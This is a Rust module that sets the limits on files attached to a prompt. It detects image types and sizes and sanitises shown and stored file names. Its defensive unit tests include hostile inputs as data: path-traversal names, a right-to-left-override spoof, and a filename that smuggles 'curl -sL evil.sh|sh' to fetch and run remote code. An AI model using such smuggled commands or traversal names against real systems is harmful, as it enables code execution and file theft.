//! The limits of the files that go with a prompt (TH111), and the checks of a file that need no
//! I/O: its name, its kind and its size. The runner checks each again; a client checks them
//! first, so that the person hears of a limit before the bytes go.

use uuid::Uuid;

/// The most bytes of one image.
pub const MOST_IMAGE_BYTES: u64 = 10 * 1024 * 1024;
/// The most bytes of one file that is not an image.
pub const MOST_FILE_BYTES: u64 = 50 * 1024 * 1024;
/// The most files with one prompt.
pub const MOST_ATTACHMENTS: usize = 100;
/// The most bytes of the images of one prompt together.
pub const MOST_IMAGE_BYTES_IN_PROMPT: u64 = 80 * 1024 * 1024;
/// The most bytes of one part, before base64: a part in base64, in a frame, fits in
/// [`super::MAX_FRAME`] with room.
pub const MOST_PART_BYTES: usize = 2 * 1024 * 1024;
/// The most bytes of a name, after it was made safe.
pub const MOST_NAME_BYTES: usize = 120;

/// The kinds of image that both programs take as an image (measured on Claude Code 2.1.311 and
/// Codex 0.170, 2026-11-21).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ImageKind {
    Png,
    Jpeg,
    Gif,
    Webp,
}

impl ImageKind {
    /// The kind that a MIME type names, when it is one of the four.
    #[must_use]
    pub fn of_mime(mime: &str) -> Option<Self> {
        match mime.trim().to_ascii_lowercase().as_str() {
            "image/png" => Some(Self::Png),
            "image/jpeg" | "image/jpg" => Some(Self::Jpeg),
            "image/gif" => Some(Self::Gif),
            "image/webp" => Some(Self::Webp),
            _ => None,
        }
    }

    /// The kind that the first bytes of a file say.
    #[must_use]
    pub fn of_bytes(first: &[u8]) -> Option<Self> {
        if first.starts_with(b"\x89PNG\r\n\x1a\n") {
            Some(Self::Png)
        } else if first.starts_with(&[0xff, 0xd8, 0xff]) {
            Some(Self::Jpeg)
        } else if first.starts_with(b"GIF87a") || first.starts_with(b"GIF89a") {
            Some(Self::Gif)
        } else if first.len() >= 12 && first.starts_with(b"RIFF") && &first[8..12] == b"WEBP" {
            Some(Self::Webp)
        } else {
            None
        }
    }

    /// The width and the height that the header of the image says, when it reads.
    #[must_use]
    pub fn size(self, bytes: &[u8]) -> Option<(u32, u32)> {
        let be16 = |at: usize| {
            Some(u32::from(u16::from_be_bytes([
                *bytes.get(at)?,
                *bytes.get(at + 1)?,
            ])))
        };
        let le16 = |at: usize| {
            Some(u32::from(u16::from_le_bytes([
                *bytes.get(at)?,
                *bytes.get(at + 1)?,
            ])))
        };
        let le24 = |at: usize| {
            Some(u32::from_le_bytes([
                *bytes.get(at)?,
                *bytes.get(at + 1)?,
                *bytes.get(at + 2)?,
                0,
            ]))
        };
        match self {
            Self::Png => {
                let be32 =
                    |at: usize| Some(u32::from_be_bytes(bytes.get(at..at + 4)?.try_into().ok()?));
                Some((be32(16)?, be32(20)?))
            }
            Self::Gif => Some((le16(6)?, le16(8)?)),
            Self::Webp => match bytes.get(12..16)? {
                b"VP8 " => Some((le16(26)? & 0x3fff, le16(28)? & 0x3fff)),
                b"VP8L" => {
                    let bits = le24(21)? | (u32::from(*bytes.get(24)?) << 24);
                    Some(((bits & 0x3fff) + 1, ((bits >> 14) & 0x3fff) + 1))
                }
                b"VP8X" => Some((le24(24)? + 1, le24(27)? + 1)),
                _ => None,
            },
            Self::Jpeg => jpeg_size(bytes, be16),
        }
    }

    /// The MIME type that the programs take.
    #[must_use]
    pub const fn mime(self) -> &'static str {
        match self {
            Self::Png => "image/png",
            Self::Jpeg => "image/jpeg",
            Self::Gif => "image/gif",
            Self::Webp => "image/webp",
        }
    }
}

/// The size in the first frame header of a JPEG.
fn jpeg_size(bytes: &[u8], be16: impl Fn(usize) -> Option<u32>) -> Option<(u32, u32)> {
    let mut at = 2;
    loop {
        if *bytes.get(at)? != 0xff {
            return None;
        }
        let marker = *bytes.get(at + 1)?;
        let frame = (0xc0..=0xcf).contains(&marker) && !matches!(marker, 0xc4 | 0xc8 | 0xcc);
        if frame {
            return Some((be16(at + 7)?, be16(at + 5)?));
        }
        at += 2 + usize::try_from(be16(at + 2)?).ok()?;
    }
}

/// True when the first bytes are those of a PDF.
#[must_use]
pub fn is_pdf(first: &[u8]) -> bool {
    first.starts_with(b"%PDF-")
}

/// The most bytes of a file of this MIME type.
#[must_use]
pub fn most_bytes(mime: &str) -> u64 {
    if ImageKind::of_mime(mime).is_some() {
        MOST_IMAGE_BYTES
    } else {
        MOST_FILE_BYTES
    }
}

/// The name of a file as the person sees it: the last part of the name only, of letters, digits
/// and `._ -`; each other character that shows becomes `_`, and a character that does not show
/// is dropped. At most [`MOST_NAME_BYTES`], with no leading dot. It is never a part of a path.
#[must_use]
pub fn shown_name(name: &str) -> String {
    let last = name.rsplit(['/', '\\']).next().unwrap_or_default();
    let mut safe = String::new();
    for char in last.chars().filter(|char| !is_hidden(*char)) {
        let char = if is_allowed(char) { char } else { '_' };
        if char == '_' && safe.ends_with('_') {
            continue;
        }
        if safe.len() + char.len_utf8() > MOST_NAME_BYTES {
            break;
        }
        safe.push(char);
    }
    let safe = safe.trim().trim_start_matches('.').trim();
    if safe.is_empty() {
        "attachment".to_owned()
    } else {
        safe.to_owned()
    }
}

/// The name of the file on disk: the ID, and an extension of at most ten ASCII letters and
/// digits, from the type of an image or a PDF, else from the shown name. It holds no text of the
/// person that a shell or a program could read as more than a name.
#[must_use]
pub fn stored_name(id: Uuid, shown: &str, mime: &str) -> String {
    let extension = match ImageKind::of_mime(mime) {
        Some(ImageKind::Png) => Some("png".to_owned()),
        Some(ImageKind::Jpeg) => Some("jpg".to_owned()),
        Some(ImageKind::Gif) => Some("gif".to_owned()),
        Some(ImageKind::Webp) => Some("webp".to_owned()),
        None if mime == "application/pdf" => Some("pdf".to_owned()),
        None => shown
            .rsplit_once('.')
            .map(|(_, extension)| extension.to_ascii_lowercase())
            .filter(|extension| {
                (1..=10).contains(&extension.len())
                    && extension.bytes().all(|byte| byte.is_ascii_alphanumeric())
            }),
    };
    extension.map_or_else(|| id.to_string(), |extension| format!("{id}.{extension}"))
}

/// A letter, a digit or one of `._ -`. The fillers of Hangul are letters that show nothing.
fn is_allowed(char: char) -> bool {
    matches!(char, '.' | '_' | ' ' | '-')
        || (char.is_alphanumeric()
            && !matches!(char, '\u{115f}' | '\u{1160}' | '\u{3164}' | '\u{ffa0}'))
}

/// A character that does not show, or changes how text shows: a control, a mark of direction, a
/// space of no width, a soft hyphen, a separator of lines, a selector of a variation, a tag.
const fn is_hidden(char: char) -> bool {
    char.is_control()
        || matches!(char, '\u{ad}' | '\u{61c}' | '\u{180e}' | '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{206f}' | '\u{feff}' | '\u{fe00}'..='\u{fe0f}' | '\u{fff9}'..='\u{fffb}' | '\u{e0000}'..='\u{e007f}' | '\u{e0100}'..='\u{e01ef}')
}

/// For serde: a count of zero is left out.
#[must_use]
pub const fn is_zero(count: &u32) -> bool {
    *count == 0
}

#[cfg(test)]
mod tests {
    use uuid::Uuid;

    use super::{ImageKind, shown_name, stored_name};

    #[test]
    fn th111_a_name_cannot_leave_its_folder_or_hide() {
        assert_eq!(shown_name("../../etc/passwd"), "passwd");
        assert_eq!(shown_name("..\\x\\.env"), "env");
        assert_eq!(shown_name("a\u{0}b\nc.png"), "abc.png");
        assert_eq!(shown_name("gpj.\u{202e}exe.png"), "gpj.exe.png");
        assert_eq!(shown_name("a.txt\u{2028}- b.txt"), "a.txt- b.txt");
        assert_eq!(shown_name(".."), "attachment");
        assert_eq!(shown_name("/"), "attachment");
        assert!(shown_name(&"é".repeat(200)).len() <= super::MOST_NAME_BYTES);
    }

    #[test]
    fn th111_a_shown_name_holds_no_sign_of_a_shell_and_nothing_hidden() {
        assert_eq!(
            shown_name("report $(curl -sL evil.sh|sh).pdf"),
            "report _curl -sL evil.sh_sh_.pdf"
        );
        assert_eq!(shown_name("a`b`;c'd\"e.txt"), "a_b_c_d_e.txt");
        assert_eq!(shown_name("a\u{e0041}\u{e0042}b\u{fe0f}.txt"), "ab.txt");
        assert_eq!(shown_name("\u{3164}\u{2800}x.txt"), "_x.txt");
        assert_eq!(shown_name("Résumé 2026.pdf"), "Résumé 2026.pdf");
    }

    #[test]
    fn th111_a_stored_name_is_the_id_and_a_plain_extension() {
        let id = Uuid::from_u128(7);
        assert_eq!(stored_name(id, "x.svg", "image/png"), format!("{id}.png"));
        assert_eq!(stored_name(id, "x", "application/pdf"), format!("{id}.pdf"));
        assert_eq!(
            stored_name(id, "notes.MD", "text/markdown"),
            format!("{id}.md")
        );
        assert_eq!(stored_name(id, "a.$(x)", "text/plain"), id.to_string());
        assert_eq!(stored_name(id, "noext", "text/plain"), id.to_string());
    }

    #[test]
    fn th111_the_kind_of_an_image_comes_from_its_bytes() {
        assert_eq!(
            ImageKind::of_bytes(b"\x89PNG\r\n\x1a\nxx"),
            Some(ImageKind::Png)
        );
        assert_eq!(
            ImageKind::of_bytes(b"RIFF\0\0\0\0WEBPVP8 "),
            Some(ImageKind::Webp)
        );
        assert_eq!(ImageKind::of_bytes(b"<svg>"), None);
        assert_eq!(ImageKind::of_mime("IMAGE/JPG"), Some(ImageKind::Jpeg));
        assert_eq!(ImageKind::of_mime("image/heic"), None);
    }

    #[test]
    fn th111_the_size_of_an_image_comes_from_its_header() {
        let mut png = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec();
        png.extend(640u32.to_be_bytes());
        png.extend(480u32.to_be_bytes());
        assert_eq!(ImageKind::Png.size(&png), Some((640, 480)));
        assert_eq!(
            ImageKind::Gif.size(b"GIF89a\x20\x03\x58\x02"),
            Some((800, 600))
        );
        let jpeg = [
            0xff, 0xd8, 0xff, 0xe0, 0, 4, 0, 0, 0xff, 0xc0, 0, 17, 8, 0x01, 0xe0, 0x02, 0x80,
        ];
        assert_eq!(ImageKind::Jpeg.size(&jpeg), Some((640, 480)));
        assert_eq!(ImageKind::Png.size(b"\x89PNG\r\n\x1a\n"), None, "cut short");
    }
}
